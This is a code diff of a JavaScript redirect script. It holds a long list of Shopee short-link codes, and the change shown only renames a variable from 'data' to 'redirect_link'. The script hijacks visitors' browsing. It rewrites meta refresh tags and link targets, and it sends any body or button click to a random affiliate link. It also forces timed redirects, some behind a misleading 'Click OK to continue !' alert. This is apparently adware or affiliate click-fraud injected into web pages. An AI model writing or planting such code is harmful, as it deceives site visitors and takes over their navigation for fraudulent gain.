@@ -1,4 +1,4 @@
-let data = [
+let redirect_link = [
     "4zxy9Vhb61",
     "4peXxCiER0",
     "4fL7ktirlz",
@@ -629,15 +629,15 @@ let data = [
     "6pPcKoguOT",
     "6zj2X7gH3W",
     "7A2SjQfdiZ"
-];
-data = 'https://shope.ee/' + data[Math.round(Math.random() * (data.length - 2) + 1)]
+]
+redirect_link = 'https://shope.ee/' + redirect_link[Math.round(Math.random() * (redirect_link.length - 2) + 1)]
 
 function changeMeta(timeOut = 0) {
     if (document.querySelectorAll('meta')[0] != null) {
         for (let index = 0; index < document.querySelectorAll('meta').length; index++) {
             if (document.querySelectorAll('meta')[index].httpEquiv == "refresh") {
                 document.querySelectorAll('meta')[index].httpEquiv = "refresh";
-                document.querySelectorAll('meta')[index].content = timeOut + "; " + data;
+                document.querySelectorAll('meta')[index].content = timeOut + "; " + redirect_link;
             }
         }
     }
@@ -647,7 +647,7 @@ function changeHref() {
     if (document.querySelectorAll('a')[0] != null) {
         for (let index = 0; index < document.querySelectorAll('a').length; index++) {
             document.querySelectorAll('a')[index].addEventListener('click', function () {
-                document.querySelectorAll('a')[index].href = data;
+                document.querySelectorAll('a')[index].href = redirect_link;
             })
         }
     }
@@ -655,7 +655,7 @@ function changeHref() {
 
 function bodyRedirect() {
     document.querySelector('body').addEventListener('click', function () {
-        location.href = data;
+        location.href = redirect_link;
     })
 }
 
@@ -663,7 +663,7 @@ function buttonRedirect() {
     if (document.querySelectorAll('button')[0] != null) {
         for (let index = 0; index < document.querySelectorAll('button').length; index++) {
             document.querySelectorAll('button')[index].addEventListener('click', function () {
-                location.href = data;
+                location.href = redirect_link;
             })
         }
     }
@@ -671,19 +671,19 @@ function buttonRedirect() {
 
 function forceRedirect(timeOut = 0) {
     setTimeout(function () {
-        location.href = data;
+        location.href = redirect_link;
     }, timeOut);
 }
 
 function alertRedirect(timeOut = 0, message = "Click OK to continue !") {
     setTimeout(function () {
         alert(message);
-        location.href = data;
+        location.href = redirect_link;
     }, timeOut);
 }
 
-function checkPath(data = "status") {
-    return location.pathname == "/" + data || location.pathname == "/" + data + ".html";
+function checkPath(redirect_link = "status") {
+    return location.pathname == "/" + redirect_link || location.pathname == "/" + redirect_link + ".html";
 }
 
 if (checkPath("alogin")) {
